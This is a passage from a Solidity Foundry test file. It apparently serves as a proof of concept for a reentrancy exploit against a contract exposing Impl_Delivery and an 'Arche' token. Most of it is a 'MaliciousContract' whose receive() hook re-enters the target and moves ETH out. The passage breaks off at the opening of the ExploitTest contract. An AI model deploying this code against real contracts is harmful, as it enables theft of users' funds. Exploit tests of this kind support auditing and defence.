pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for the malicious contract
interface IMalicious {
    function setTarget(address _target) external;
    function withdraw() external;
}

// Malicious contract implementation
contract MaliciousContract {
    address public target;
    uint256 public reentrancyCount = 0;
    uint256 public maxReentrancy = 3; // Limit to avoid out of gas

    function setTarget(address _target) external {
        target = _target;
    }

    // Fallback function for receiving ETH
    receive() external payable {
        reentrancyCount++;

        if (reentrancyCount < maxReentrancy) {
            // Reenter the vulnerable function
            // Try calling Impl_Delivery again
            (bool success, ) = target.call(
                abi.encodeWithSignature(
                    "Impl_Delivery(address,uint256)",
                    address(this),
                    1 ether
                )
            );

            // Also send funds to attacker
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Need to have some Arche token balance to participate
    function approveArche(address archeToken) external {
        (bool success, ) = archeToken.call(
            abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max)
        );
    }
}

contract ExploitTest is Test {
